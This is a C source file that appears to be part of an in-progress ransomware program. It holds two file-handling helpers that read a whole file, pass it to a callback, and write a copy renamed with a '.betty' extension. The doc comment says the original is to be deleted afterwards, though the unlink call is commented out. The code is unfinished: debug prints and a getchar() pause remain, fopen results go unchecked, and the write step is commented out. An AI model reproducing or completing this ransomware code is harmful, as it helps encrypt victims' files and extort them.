#include "fournights.h"
/**
  * read_file - reads lines from a file, and executes a function on them.
 (* TODO: Function pointer is of type char **;
 (*       NOT MODULAR.
 (*       Build a helper function to set
 (*       the right return type?
  * Deletes the file afterwards
  * @filepath: filepath to read
  * @head: head of a linked list
  * @fxn: pointer to function to enact on lines
  * Return: number of bytes read
 **/
size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *ransom))
{
	/*
	int read = 0;
	*/
	size_t bytes_read = 0;
	FILE *fd = NULL;
	char *buf = NULL;

	if (!filepath || !ransom)
		return(0);
	fd = fopen(filepath, "rb");
	fseek(fd, 0, SEEK_END);
	bytes_read = ftell(fd);
printf("filesize: %d\n", (int)bytes_read);
	if(bytes_read == 0)
	{
		fclose(fd);
		fprintf(stderr, "File is empty\n");
		return(0);
	}
	rewind(fd);
	buf = (char *)my_calloc((bytes_read + 1) * sizeof(char), sizeof(char));
	fread(buf, bytes_read, sizeof(char), fd);
	buf[bytes_read] = '\0';
printf("orig: %s\n", buf);
getchar();
	if(fxn)
		fxn(buf, ransom);
	/*
	printf("base64: %s\n", base64encode(buf, read));
	while((read = getline(&buf, &bytes_read, fd)) > 0)
	{
		printf("%s", buf);
		if (fxn && read > 2)
		{
			buf[read] = '\0';
			fxn(buf, ransom);
		}
		else
			printf("base64: %s\n", base64encode(buf, read));
	}
	*/
	free(buf);
	fclose(fd);
	/* unlink(filepath); */
	return (bytes_read);
}

/**
  * write_file - writes the contents of a buffer to a file.
  * @filepath: filepath to write
  * @buffer: buffer to write into the file
  * Return: number of bytes read
 **/
size_t write_file(node_t *node, char *buffer)
{
	unsigned int new_ext_len = 0;
	size_t bytes_written = 0;
	char *new_ext = ".betty";
	FILE *fd = NULL;
	struct stat file_info;


	stat(node->str, &file_info);
	new_ext_len = my_strlen(new_ext);
	node->str = recalloc(node->str, node->len, node->len + new_ext_len+ 1);
	my_strncat(node->str, new_ext, node->len, new_ext_len);
	buffer++;

	chmod(node->str, file_info.st_mode);
	fd = fopen(node->str, "wb+");
	/*
	bytes_written = fwrite((const char *)buffer, size, sizeof(char), fd);
	*/
	fclose(fd);
	return(bytes_written);
}
